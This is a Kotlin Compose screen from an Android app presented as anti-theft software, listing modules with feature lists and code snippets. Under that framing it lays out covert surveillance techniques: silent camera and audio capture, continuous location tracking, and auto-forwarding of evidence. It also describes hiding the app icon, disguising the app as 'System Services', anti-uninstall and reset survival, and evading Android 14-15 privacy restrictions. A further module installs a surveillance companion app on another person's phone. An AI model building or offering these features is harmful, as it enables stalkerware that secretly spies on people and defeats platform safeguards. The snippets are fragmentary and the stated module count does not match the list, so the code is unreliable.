package com.shield.antitheft.ui.screens

import androidx.compose.animation.AnimatedVisibility
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.navigation.NavController

data class ModuleDetail(
    val id: String, val name: String, val icon: String, val color: Color,
    val desc: String, val features: List<String>, val code: String, val route: String
)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ModulesScreen(navController: NavController) {
    val modules = listOf(
        ModuleDetail("biometric", "Biometric Capture System", "📸", Color(0xFF22D3EE),
            "Advanced biometric data collection for thief identification using all available cameras and sensors",
            listOf("Silent front camera capture", "Rear camera capture", "Burst mode (10 photos/sec)", "Night mode photos", "Video recording 30s", "Voice sample recording", "Voice stress analysis", "Fingerprint from screen taps", "Face detection via TensorFlow", "Real-time streaming", "Flash as torch", "EXIF GPS tagging", "Auto-upload to cloud", "Email with attachments", "WhatsApp forward", "Telegram bot forward", "SMS alert with photo", "Local encrypted storage"),
            "val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager\nval cameraId = cameraManager.cameraIdList.first()\nval reader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 5)\nreader.setOnImageAvailableListener({ r ->\n    val image = r.acquireLatestImage()\n    val bytes = ByteArray(image.planes[0].buffer.remaining())\n    image.planes[0].buffer.get(bytes)\n    FileOutputStream(File(cacheDir, \"thief.jpg\")).use { it.write(bytes) }\n    sendEmail(\"emergency@gmail.com\", \"Thief Photo\", file)\n    image.close()\n}, backgroundHandler)\ncameraManager.openCamera(cameraId, callback, null)",
            "command"),
        ModuleDetail("location", "Location Tracking System", "📍", Color(0xFF34D399),
            "Multi-layer location tracking using GPS, WiFi, Cell towers, and dead reckoning",
            listOf("GPS coordinates every 5 min", "WiFi RSSI triangulation", "Cell tower triangulation", "Sensor dead reckoning", "Geofence alerts", "Magnetic field mapping", "Barometric altitude", "Google Maps link", "Location history log", "Export to KML/GPX", "Speed tracking", "Direction tracking"),
            "val lm = getSystemService(LOCATION_SERVICE) as LocationManager\nval notification = NotificationCompat.Builder(this, CH)\n    .setContentTitle(\"Navigation\").setOngoing(true).build()\nstartForeground(1001, notification)\nlm.requestLocationUpdates(GPS, 300000L, 0f, { loc ->\n    val link = \"https://maps.google.com/?q=LAT,LNG\"\n    sendEmail(\"Location Update\", link)\n})",
            "command"),
        ModuleDetail("stealth", "Stealth Mode System", "👻", Color(0xFF8B5CF6),
            "Complete app concealment - hide from launcher, disguise as system app, fake calculator front",
            listOf("Hide app icon from launcher", "Disguise as 'System Services'", "Fake calculator on wrong code", "Disable notifications", "Silent background operation", "Anti-uninstall protection", "Factory reset survival", "Root detection evasion", "Process name obfuscation", "Icon and label spoofing"),
            "val pm = packageManager\npm.setComponentEnabledSetting(\n    ComponentName(this, MainActivity::class.java),\n    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,\n    PackageManager.DONT_KILL_APP\n)\n// App icon disappears from launcher\n// Still runs via dialer code: *#*#SHIELD#*#*",
            "stealth"),
        ModuleDetail("evidence", "Evidence Collection Flow", "📦", Color(0xFFFBBF24),
            "Automated evidence collection, packaging, and delivery to emergency contacts",
            listOf("Photo capture on unlock", "Audio recording on motion", "GPS logging continuously", "Auto-email every 15 min", "Cloud backup (Google Drive)", "WhatsApp auto-forward", "Telegram auto-post", "SMS with photo MMS", "Evidence chain documentation", "Timestamp watermarking", "Location stamp on photos", "MD5 hash verification", "PDF report generation", "Court-admissible packaging"),
            "fun collectEvidence() {\n    val photo = captureSilentPhoto()\n    val audio = recordAmbientAudio(30)\n    val loc = getGPSCoordinates()\n    val report = buildEvidenceReport(photo, audio, loc)\n    sendEmail(\"emergency@gmail.com\", report, listOf(photo, audio))\n    uploadToCloud(report)\n}",
            "evidence"),
        ModuleDetail("alerts", "Multi-Channel Alert System", "🚨", Color(0xFFF87171),
            "Send alerts through multiple channels with escalation - never miss a theft event",
            listOf("Email (SMTP) primary", "SMS fallback", "Telegram bot", "WhatsApp message", "Push notification", "Escalation chain", "Scheduled digest", "Multi-recipient", "Silent vs Loud modes", "Custom templates", "Geofence triggers"),
            "fun sendAlert(msg: String, evidence: File) {\n    try { sendEmail(\"emergency@gmail.com\", msg, evidence) }\n    catch (e: Exception) {\n        try { sendSMS(\"+254700000000\", msg) }\n        catch (e2: Exception) {\n            sendTelegram(\"@emergency_chat\", msg)\n        }\n    }\n}",
            "alerts"),
        ModuleDetail("bypass", "Android 15 Bypass Engine", "🔓", Color(0xFFFBBF24),
            "23 bypass techniques for Android 14-15 restrictions on anti-theft apps",
            listOf("SMS → Email replacement", "Camera foreground disguise", "GPS navigation disguise", "WiFi triangulation", "Cell tower location", "Sensor dead reckoning", "Bluetooth beacon positioning", "IMEI alternatives", "WorkManager background", "Foreground service keepalive", "MQTT lightweight protocol", "WebSocket persistent connection", "FCM push notifications", "Notification listener", "Quick Settings tile", "MediaProjection screen capture", "ADB wireless install", "Settings.Global device ID", "Advertising ID", "SpoofCheck fingerprint", "Scoped storage bypass", "MANAGE_EXTERNAL_STORAGE", "Default dialer role"),
            "// 23 bypass techniques - see Bypass screen for full details\nval bypasses = mapOf(\n    \"SMS\" to EmailBypass(),\n    \"Camera\" to ForegroundDisguise(),\n    \"GPS\" to NavigationDisguise(),\n    \"Audio\" to ChunkedRecording(),\n    \"Storage\" to ScopedStorageBypass()\n)",
            "bypass"),
        ModuleDetail("remote", "Remote Install System", "📲", Color(0xFFA78BFA),
            "Install companion apps on thief's device remotely for enhanced surveillance",
            listOf("ADB wireless install", "Web download install", "Firebase distribution", "QR code install", "NFC beam install", "Bluetooth transfer", "Email attachment", "Direct link download"),
            "val intent = Intent(Intent.ACTION_VIEW)\nintent.setDataAndType(\n    Uri.parse(\"https://server.com/shield.apk\"),\n    \"application/vnd.android.package-archive\"\n)\nintent.flags = FLAG_GRANT_READ_URI_PERMISSION\nstartActivity(intent)",
            "install"),
        ModuleDetail("security", "Security Lab", "🔬", Color(0xFF34D399),
            "Test and verify all protection systems are working correctly",
            listOf("GPS spoofing detection test", "SIM swap detection", "Root detection check", "USB debugging check", "App signature verification", "Network security test", "Camera availability test", "Microphone test", "Storage access test", "SMS capability test", "Email SMTP test", "Background service test", "Boot receiver test", "Battery optimization test", "Doze mode test"),
            "fun runSecurityTests(): Map<String, Boolean> {\n    return mapOf(\n        \"GPS\" to testGPS(),\n        \"SIM\" to detectSIMChange(),\n        \"Root\" to checkRoot(),\n        \"USB\" to checkADB(),\n        \"Signature\" to verifyAppSignature()\n    )\n}",
            "security"),
    )

    Scaffold(
        topBar = { TopAppBar(title = { Text("Modules + Code", fontWeight = FontWeight.Bold) }, navigationIcon = { IconButton(onClick = { navController.popBackStack() }) { Icon(Icons.Default.ArrowBack, "Back") } }, colors = TopAppBarDefaults.topAppBarColors(containerColor = Color(0xFF0F172A))) }
    ) { padding ->
        LazyColumn(modifier = Modifier.padding(padding).padding(12.dp)) {
            item {
                Card(colors = CardDefaults.cardColors(containerColor = Color(0xFF22D3EE).copy(alpha = 0.1f)), modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp)) {
                    Row(modifier = Modifier.padding(16.dp)) {
                        Icon(Icons.Default.Extension, null, tint = Color(0xFF22D3EE))
                        Spacer(Modifier.width(8.dp))
                        Column {
                            Text("9 Modules with Full Source Code", fontSize = 13.sp, fontWeight = FontWeight.Bold, color = Color(0xFF22D3EE))
                            Text("${modules.sumOf { it.features.size }} total features • Tap to expand", fontSize = 10.sp, color = Color.Gray)
                        }
                    }
                }
            }
            items(modules) { mod ->
                var expanded by remember { mutableStateOf(false) }
                var showCode by remember { mutableStateOf(false) }
                
                Card(modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp).clickable { expanded = !expanded },
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B))) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text(mod.icon, fontSize = 36.sp)
                            Spacer(Modifier.width(12.dp))
                            Column(Modifier.weight(1f)) {
                                Text(mod.name, fontSize = 15.sp, fontWeight = FontWeight.Bold, color = mod.color)
                                Text(mod.desc, fontSize = 11.sp, color = Color.Gray)
                                Text("${mod.features.size} features", fontSize = 10.sp, color = mod.color)
                            }
                            Row {
                                TextButton(onClick = { navController.navigate(mod.route) }) { Text("Open", fontSize = 10.sp, color = mod.color) }
                                Icon(if (expanded) Icons.Default.ExpandLess else Icons.Default.ExpandMore, null, tint = Color.Gray)
                            }
                        }
                        AnimatedVisibility(visible = expanded) {
                            Column(modifier = Modifier.padding(top = 12.dp)) {
                                Text("Features:", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = Color.White)
                                Spacer(Modifier.height(4.dp))
                                Row(horizontalArrangement = Arrangement.spacedBy(4.dp), modifier = Modifier.fillMaxWidth()) {
                                    mod.features.chunked(6).forEach { chunk ->
                                        Column(Modifier.weight(1f)) {
                                            chunk.forEach { feature ->
                                                Text("• $feature", fontSize = 9.sp, color = Color(0xFFA0A0B8), modifier = Modifier.padding(vertical = 1.dp))
                                            }
                                        }
                                    }
                                }
                                Spacer(Modifier.height(8.dp))
                                Surface(modifier = Modifier.fillMaxWidth().clickable { showCode = !showCode },
                                    color = Color(0xFF0F172A), shape = MaterialTheme.shapes.small) {
                                    Column(modifier = Modifier.padding(8.dp)) {
                                        Row(verticalAlignment = Alignment.CenterVertically) {
                                            Icon(Icons.Default.Code, null, tint = mod.color, modifier = Modifier.size(14.dp))
                                            Spacer(Modifier.width(6.dp))
                                            Text("Implementation Code", fontSize = 10.sp, color = Color.Gray, modifier = Modifier.weight(1f))
                                            Text(if (showCode) "Hide ▲" else "View ▼", fontSize = 9.sp, color = mod.color)
                                        }
                                        AnimatedVisibility(visible = showCode) {
                                            Text(mod.code, fontSize = 8.sp, fontFamily = FontFamily.Monospace, color = Color(0xFF34D399), modifier = Modifier.padding(top = 6.dp))
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            item { Spacer(Modifier.height(80.dp)) }
        }
    }
}
